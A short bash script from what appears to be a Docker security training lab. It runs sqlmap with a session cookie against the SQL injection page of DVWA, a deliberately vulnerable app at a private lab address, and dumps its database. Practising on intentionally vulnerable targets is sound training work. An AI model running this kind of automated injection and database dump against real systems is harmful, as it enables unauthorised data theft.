#!/bin/bash
# SQL Injection — run from inside lab-attacker:
#   docker exec -it lab-attacker bash /work/sqli.sh
#
# Prerequisite (one-time, via the browser): log into DVWA at
# http://172.30.0.10/ (admin/password), set security level to "low"
# under DVWA Security, then grab your PHPSESSID cookie from devtools
# and paste it below.
set -e

DVWA_COOKIE=${DVWA_COOKIE:-"PHPSESSID=REPLACE_ME; security=low"}
URL="http://172.30.0.10/vulnerabilities/sqli/?id=1&Submit=Submit"

echo "[*] sqlmap against DVWA SQLi page"
sqlmap -u "$URL" --cookie="$DVWA_COOKIE" --batch --level=2 --risk=1 --dump
